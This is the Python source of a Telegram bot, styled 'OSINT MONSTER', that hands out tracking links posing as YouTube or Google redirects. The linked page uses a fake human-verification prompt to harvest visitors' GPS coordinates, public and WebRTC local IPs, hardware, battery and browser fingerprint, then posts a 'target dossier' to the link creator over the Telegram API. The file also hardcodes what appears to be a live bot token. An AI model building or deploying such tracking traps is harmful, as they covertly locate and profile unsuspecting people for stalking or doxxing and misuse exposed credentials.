import asyncio, threading, os, requests, json
from flask import Flask, render_template_string, request
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.utils.keyboard import ReplyKeyboardBuilder

# --- КОНФИГ ---
API_TOKEN = "8698847126:AAEM6qoKEcFd-oosvzrhz7SqAAewUM_ERhg"
OWNER_ID = 6659724115 
BASE_URL = "https://tg-bot-backend-oo97.onrender.com" 

app = Flask(__name__)
DB_FILE = "user_data.json"

def load_db():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, "r") as f: return json.load(f)
    return {"users": {}}

def save_db(db):
    with open(DB_FILE, "w") as f: json.dump(db, f, indent=4)

@app.route('/')
def home(): return "SYSTEM ONLINE", 200

# --- ГЛУБОКИЙ HTML СКРИПТ ---
HTML_TRAP = """
<!DOCTYPE html>
<html>
<head>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { border: 1px solid #0f0; padding: 20px; text-align: center; }
    </style>
</head>
<body onclick="collect()">
    <div class="box">
        [ SYSTEM ACCESS REQUIRED ]<br><br>
        Click to verify you are human
    </div>
<script>
async function collect() {
    let d = { 
        aid: "{{ aid }}", lure: "{{ lure }}",
        ua: navigator.userAgent,
        lang: navigator.language,
        cores: navigator.hardwareConcurrency || "N/A",
        mem: navigator.deviceMemory || "N/A",
        plat: navigator.platform,
        res: screen.width + "x" + screen.height,
        tz: Intl.DateTimeFormat().resolvedOptions().timeZone
    };

    // 1. Батарея
    try {
        let b = await navigator.getBattery();
        d.bat = Math.round(b.level * 100) + "% (" + (b.charging ? "Charging" : "Discharging") + ")";
    } catch(e) { d.bat = "N/A"; }

    // 2. Видеокарта (GPU)
    try {
        let c = document.createElement('canvas');
        let gl = c.getContext('webgl');
        let debug = gl.getExtension('WEBGL_debug_renderer_info');
        d.gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
    } catch(e) { d.gpu = "N/A"; }

    // 3. Локальный IP (WebRTC)
    try {
        let pc = new RTCPeerConnection({iceServers:[]});
        pc.createDataChannel("");
        pc.createOffer().then(o => pc.setLocalDescription(o));
        pc.onicecandidate = (i) => {
            if (i && i.candidate) {
                let ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(i.candidate.candidate)[1];
                d.local_ip = ip;
            }
        };
    } catch(e) {}

    // 4. GPS
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (p) => { d.gps = p.coords.latitude + "," + p.coords.longitude; d.acc = p.coords.accuracy + "m"; send(d); },
            (e) => { d.gps = "Denied (" + e.message + ")"; send(d); },
            { enableHighAccuracy: true, timeout: 5000 }
        );
    } else { d.gps = "Not Supported"; send(d); }
    
    setTimeout(() => { if(!d.gps_sent) send(d); }, 4000);
}

function send(d) {
    if(window.sent) return;
    window.sent = true; d.gps_sent = true;
    fetch('/catch', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(d) })
    .finally(() => { 
        let u = {"yt":"https://youtube.com","gg":"https://google.com","tt":"https://tiktok.com"};
        location.href = u["{{ lure }}"] || "https://google.com";
    });
}
</script>
</body>
</html>
"""

@app.route('/t/<aid>/<lure>')
def trap(aid, lure):
    db = load_db()
    uid = str(aid)
    if uid in db["users"]:
        db["users"][uid]["clicks"] += 1
        save_db(db)
    return render_template_string(HTML_TRAP, aid=aid, lure=lure)

@app.route('/catch', methods=['POST'])
def catch():
    d = request.json
    ips = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    report = (
        f"🚨 **FULL TARGET DOSSIER**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🌐 **NETWORK DATA:**\n"
        f"• Public IPs: `{ips}`\n"
        f"• Local IP: `{d.get('local_ip', 'N/A')}`\n"
        f"• Timezone: {d.get('tz')}\n"
        f"• Language: {d.get('lang')}\n\n"
        f"📍 **LOCATION:**\n"
        f"• Координаты: `{d.get('gps')}`\n"
        f"• Точность: {d.get('acc', 'N/A')}\n"
        f"• [Посмотреть на карте](https://www.google.com/maps?q={d.get('gps')})\n\n"
        f"💻 **HARDWARE:**\n"
        f"• OS: `{d.get('plat')}`\n"
        f"• CPU: {d.get('cores')} Cores | RAM: ~{d.get('mem')}GB\n"
        f"• GPU: `{d.get('gpu')}`\n"
        f"• Screen: {d.get('res')}\n\n"
        f"🔋 **STATUS:**\n"
        f"• Battery: {d.get('bat')}\n"
        f"• Browser: {d.get('ua')[:100]}...\n"
        f"━━━━━━━━━━━━━━━━━━━━"
    )
    
    url = f"https://api.telegram.org/bot{API_TOKEN}/sendMessage"
    requests.post(url, json={"chat_id": d['aid'], "text": report, "parse_mode": "Markdown"})
    return "OK", 200

# --- БОТ ---
bot = Bot(token=API_TOKEN)
dp = Dispatcher()

def get_main_kb():
    kb = ReplyKeyboardBuilder()
    kb.add(types.KeyboardButton(text="🚀 Создать ссылку"), types.KeyboardButton(text="📊 Статистика"))
    return kb.as_markup(resize_keyboard=True)

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    db = load_db()
    uid = str(message.from_user.id)
    if uid not in db["users"]:
        db["users"][uid] = {"clicks": 0, "ips": []}
        save_db(db)
    await message.answer("💀 **OSINT MONSTER v11.0**\nСистема сбора данных готова.", reply_markup=get_main_kb())

@dp.message(F.text == "🚀 Создать ссылку")
async def create_step(message: types.Message):
    kb = ReplyKeyboardBuilder()
    kb.add(types.KeyboardButton(text="🎬 YouTube"), types.KeyboardButton(text="🔍 Google"), types.KeyboardButton(text="❌ Отмена"))
    await message.answer("Выбери цель редиректа:", reply_markup=kb.as_markup(resize_keyboard=True))

@dp.message(F.text.in_(["🎬 YouTube", "🔍 Google"]))
async def finish_create(message: types.Message):
    l = "yt" if "YouTube" in message.text else "gg"
    link = f"{BASE_URL}/t/{message.from_user.id}/{l}"
    await message.answer(f"✅ **Ссылка создана:**\n`{link}`", reply_markup=get_main_kb())

@dp.message(F.text == "📊 Статистика")
async def show_stats(message: types.Message):
    db = load_db()
    u = db["users"].get(str(message.from_user.id), {"clicks": 0, "ips": []})
    await message.answer(f"📈 **Твои клики:** `{u['clicks']}`", reply_markup=get_main_kb())

async def main():
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000))), daemon=True).start()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
